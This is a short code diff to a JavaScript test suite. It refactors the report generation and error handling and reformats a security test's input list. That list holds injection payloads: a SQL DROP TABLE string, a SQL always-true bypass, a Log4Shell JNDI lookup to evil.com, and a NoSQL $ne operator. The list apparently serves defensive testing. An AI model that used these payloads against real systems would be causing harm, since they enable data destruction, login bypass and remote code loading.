@@ -531,7 +531,7 @@ async function testSecuritySystems() {
                     "'; DROP TABLE users; --",
                     "1' OR '1'='1",
                     "${jndi:ldap://evil.com/a}",
-                    {"$ne": null}
+                    { "$ne": null }
                 ];
 
                 const results = [];
@@ -846,6 +846,7 @@ function generateReport() {
     );
 
     console.log('\n📄 Detailed report saved to: test-report-' + Date.now() + '.json');
+    return reportData;
 }
 
 // Main Test Runner
@@ -862,10 +863,10 @@ async function runComprehensiveTests() {
         await testSecuritySystems();
         await runPerformanceBenchmarks();
 
-        generateReport();
+        return generateReport();
     } catch (error) {
         console.error('\n💥 Test suite crashed:', error);
-        process.exit(1);
+        throw error;
     }
 }
 
